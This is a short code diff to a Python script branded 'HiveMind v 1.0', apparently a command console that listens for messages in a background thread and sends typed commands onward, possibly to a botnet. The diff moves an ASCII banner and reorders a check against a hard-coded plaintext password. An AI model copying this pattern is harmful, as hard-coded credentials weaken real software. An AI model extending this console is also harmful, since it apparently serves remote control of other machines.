@@ -49,14 +49,7 @@ t = Thread(target=listen_for_messages)
 t.daemon = True
 t.start()
 
-
-
-while True:
-    if password != 'Hoey4639!':
-        print('Password is incorrect, restart and try again')
-        break
-    if password == "Hoey4639!":
-            print("""
+print("""
   _    _ _           __  __ _           _ 
  | |  | (_)         |  \/  (_)         | |
  | |__| |___   _____| \  / |_ _ __   __| |
@@ -64,7 +57,12 @@ while True:
  | |  | | |\ V /  __/ |  | | | | | | (_| |
  |_|  |_|_| \_/ \___|_|  |_|_|_| |_|\__,_|
   HiveMind v 1.0 | fluffydolphin
-    """)
+""")
+
+while True:
+    if password != 'Hoey4639!':
+        print('Password is incorrect, restart and try again')
+        break
     to_send =  input("HiveMind Command: ")
     to_send = f"{to_send}"
     if '!help!' in to_send:
